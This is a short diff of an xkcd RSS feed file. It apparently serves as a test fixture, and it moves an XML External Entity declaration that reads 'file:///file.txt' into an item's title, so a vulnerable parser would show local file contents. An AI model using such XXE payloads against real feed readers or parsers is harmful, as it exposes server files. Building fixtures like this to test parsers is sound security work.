@@ -1,7 +1,7 @@
  <?xml version="1.0" encoding="ISO-8859-1"?>
- <!DOCTYPE foo [  
-   <!ELEMENT foo ANY >
-   <!ENTITY xxe SYSTEM "file:///file.txt" >]><foo>&xxe;</foo>
+ <!DOCTYPE title [  
+   <!ELEMENT title ANY >
+   <!ENTITY xxe SYSTEM "file:///file.txt" >]>
 
 <channel>
 <title>xkcd.com</title>
@@ -9,7 +9,7 @@
 <description>xkcd.com: A webcomic of romance and math humor.</description>
 <language>en</language>
 <item>
-<title>Luna 2</title>
+<title>&xxe;</title>
 <link>https://xkcd.com/2125/</link>
 <description>
 <img src="https://imgs.xkcd.com/comics/luna_2.png" title="The flags were probably vaporized on impact, because we launched it before we had finished figuring out how to land. That makes sense from an engineering standpoint, but also feels like a metaphor." alt="The flags were probably vaporized on impact, because we launched it before we had finished figuring out how to land. That makes sense from an engineering standpoint, but also feels like a metaphor." />
